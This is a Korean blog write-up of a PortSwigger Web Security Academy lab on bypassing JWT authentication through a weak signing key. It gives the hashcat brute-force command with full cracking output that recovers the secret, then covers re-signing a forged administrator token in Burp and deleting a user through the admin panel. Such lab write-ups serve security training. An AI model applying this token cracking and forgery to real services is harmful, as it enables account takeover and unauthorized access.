---
layout: post
title: "Burp Academy-JWT 세번째 문제:JWT authentication bypass via weak signing key"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, JWT취약점]
toc: true
last_modified_at: 2025-03-11 05:55:00 +0900
---


# 개요
- JWT(JSON Web Token) 취약점 세번째 문제이다. 
- JWT 취약점 설명 주소: https://portswigger.net/web-security/jwt
- 문제 주소: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
- 난이도: PRACTITIONER (중간)

# 취약점 개요: Brute-forcing secret keys
`HS256 (HMAC + SHA-256)` 과 같은 어떤 서명 알고리즘은 임의의 문자열을 시크릿 키로 사용한다. 이 시크릿 키는 패스워드에 요구되는 것과 같이 쉽게 추측하거나 브루트 포스로 공격할 수 없어야 한다. 그렇지않으면, JWT의 헤더나 페이로드의 값을 쉽게 변조하고 재서명할 수 있게 되어 버린다. 

JWT 어플리케이션을 구현할 때, 개발자는 가끔 시크릿 키를 알려진 시크릿 키로 사용하는 실수를 범한다. 인터넷에서 찾은 코드 조각을 복사하여 붙여넣은 다음, 예시로 제공된 하드코딩된 비밀을 변경하는 것을 잊을 수도 있다. 이 경우 공격자가 [잘 알려진 시크릿 단어 목록](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)을 사용하여 서버의 키을 브루트 포스 공격할 수 있다. 

## 해시캣(hashcat)을 사용해서 시크릿 키 브루트포스 공격하기(Brute-forcing secret keys using hashcat)
비밀 키를 브루트포스 공격하려면 hashcat을 사용하는 것이 좋다. hashcat을 수동으로 설치할 수 있지만 , Kali Linux에 미리 설치되어 있으므로 편리하다. 

준비물은 대상 서버의 유효한 서명된 JWT와 "잘 알려진 시크릿 단어 목록"이다. 다음 명령을 실행하여 JWT와 단어 목록을 파라메터로 전달할 수 있다. 

```sh
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

Hashcat은 단어 목록에 있는 단어(시크릿)을 사용하여 JWT의 헤더와 페이로드에 서명한 다음, 결과 서명을 서버의 원본 서명과 비교한다. 서명 중 하나라도 일치하면 hashcat은 다양한 다른 세부 정보와 함께 다음 형식으로 식별된 시크릿을 출력한다. 

```sh
<jwt>:<identified-secret>
```

Hashcat은 컴퓨터에서 로컬로 실행되고 서버로 요청을 보내는데 의존하지 않으므로, 거대한 단어 목록을 사용하더라도 프로세스가 매우 빠르게 진행된다.

시크릿 키를 식별한 후에는 원하는 JWT 헤더와 페이로드에 대한 유효한 서명을 생성하는 데 사용할 수 있다. 

# 문제 설명
- 이 랩은 JWT 기반으로 세션을 처리한다. 서버는 아주 약한 시크릿키를 사용하여 토큰에 서명하고 토큰의 서명을 검증한다. 이는 알려진 시크릿을 사용하여 브루트 포스 공격하는 것을 쉽게 만든다. 
- 랩을 풀려면 먼저 웹 사이트의 시크릿 키를 브루트 포스로 알아낸다. 그 후, 알아낸 시크릿 키를 사용하여 세션 토큰을 변조하고, 관리자 패널(/admin)에 접근하여 carlos유저를 삭제하면 된다.
- wiener:peter 크레덴셜을 사용하여 로그인 가능하다. 

```
This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이
## 브루트 포스로 시크릿 키 얻어내기 
※ 먼저 Burp Suite에서 `JWT Editor`확장 프로그램을 로드해둔다. 

1. 브루트 포스로 시크릿 키를 얻어낼 것이다. 주어진 크레덴셜로 로그인해서 다음 JWT를 얻었다. 

```
eyJraWQiOiJmNGJjMDU1MC1jY2IxLTQ2MzUtOTM0MS1kOWU2ZWY2ZDhlZDQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MTY1OTc2MSwic3ViIjoid2llbmVyIn0.zw7u4gaYbtOnppPrEap9ueE-rt5BOpLRDRs0L3tKVGo
```

2. 이 것을 hashcat으로 해킹한다. 다음 커맨드를 사용했다.

```sh
mkdir jwt-secrets
cd jwt-secrets
# 알려진 JWT 시크릿 키 리스트를 다운로드
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list
# 브루트포스: a 옵션은 attack-mode다. 0은 Straight를 의미한다.  m 옵션은 hash-type이다. 16500은 JWT를 의미한다. 
hashcat -a 0 -m 16500 eyJraWQiOiJmNGJjMDU1MC1jY2IxLTQ2MzUtOTM0MS1kOWU2ZWY2ZDhlZDQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MTY1OTc2MSwic3ViIjoid2llbmVyIn0.zw7u4gaYbtOnppPrEap9ueE-rt5BOpLRDRs0L3tKVGo jwt.secrets.list
```

3. 실행결과는 다음과 같다. 크랙에 성공하여 시크릿이 `secret1`이라는 것을 알아냈다. 

```sh
┌──(kali㉿kali)-[~/jwt-secrets]
└─$ hashcat -a 0 -m 16500 eyJraWQiOiJmNGJjMDU1MC1jY2IxLTQ2MzUtOTM0MS1kOWU2ZWY2ZDhlZDQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MTY1OTc2MSwic3ViIjoid2llbmVyIn0.zw7u4gaYbtOnppPrEap9ueE-rt5BOpLRDRs0L3tKVGo jwt.secrets.list
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1437/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: jwt.secrets.list
* Passwords.: 103975
* Bytes.....: 1231359
* Keyspace..: 103961
* Runtime...: 0 secs

eyJraWQiOiJmNGJjMDU1MC1jY2IxLTQ2MzUtOTM0MS1kOWU2ZWY2ZDhlZDQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MTY1OTc2MSwic3ViIjoid2llbmVyIn0.zw7u4gaYbtOnppPrEap9ueE-rt5BOpLRDRs0L3tKVGo:secret1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJraWQiOiJmNGJjMDU1MC1jY2IxLTQ2MzUtOTM0MS1kOWU2ZWY...3tKVGo
Time.Started.....: Tue Mar 11 01:44:26 2025 (0 secs)
Time.Estimated...: Tue Mar 11 01:44:26 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (jwt.secrets.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   879.7 kH/s (0.37ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/103961 (0.49%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/103961 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....:  -> 6ce33aa7-3edd-44eb-9060-74c61e3a96b1

Started: Tue Mar 11 01:44:25 2025
Stopped: Tue Mar 11 01:44:28 2025

┌──(kali㉿kali)-[~/jwt-secrets]
└─$

```


## 얻어낸 시크릿으로 서명용 키 생성하기 
1. Burp Decoder에서 알아낸 secret을 Base64인코딩한다. 이 값을 클립보드에 복사해둔다. 

```
c2VjcmV0MQ==
```

2. JWT Editor 탭에서 New Symmetric Key 버튼을 누른다. 그 후에 Generate 버튼을 누른다. 그러면 새로운 키가 생성된다. 여기서 k 의 값을 바꿀 것이다. 

![](/images/burp-academy-jwt-3-1.png)

3. k의 값을 1번 과정에서 생성해둔 Base64값으로 변경하고 OK버튼을 누른다. 

![](/images/burp-academy-jwt-3-2.png)

4. 새로운 키가 생성되었다. 

![](/images/burp-academy-jwt-3-3.png)

## JWT토큰 변조하기 
1. 유저정보를 조회하는 요청 `GET /my-account?id=wiener`을 Proxy의 HTTP History탭에서 찾아서 Repeater로 보낸다. JWT Web Token 탭에서 Payload 부분의 `sub`값을 administrator로 변경한다. 그리고 Sign버튼을 클릭한다. 

![](/images/burp-academy-jwt-3-4.png)

2. 서명할 때 어떤 키를 사용할 것인지 묻는 팝업이 나타난다. 위의 과정에서 만들어둔 키를 선택한다. `alg`는 HS256 으로, Header Options는 Don't modify header인 상태로 둔다.  OK를 누른다. 

![](/images/burp-academy-jwt-3-5.png)

3. HTTP 요청 `GET /my-account?id=wiener` 부분의 id파라메터를 administrator로 변경한 후에 요청을 보낸다. 그러면 200응답이 회신되고 HTML페이지 안에 관리자 패널이 있는 것을 볼 수 있다. 관리자의 세션 토큰을 얻는 것에 성공했다! 

![](/images/burp-academy-jwt-3-6.png)

4. `GET /admin` 으로 요청을 보내면 carlos유저를 삭제하는 경로 `/admin/delete?username=carlos`가 보인다. carlos 유저를 삭제하는 요청을 보내면 랩이 풀린다. 

![](/images/burp-academy-jwt-3-success.png)

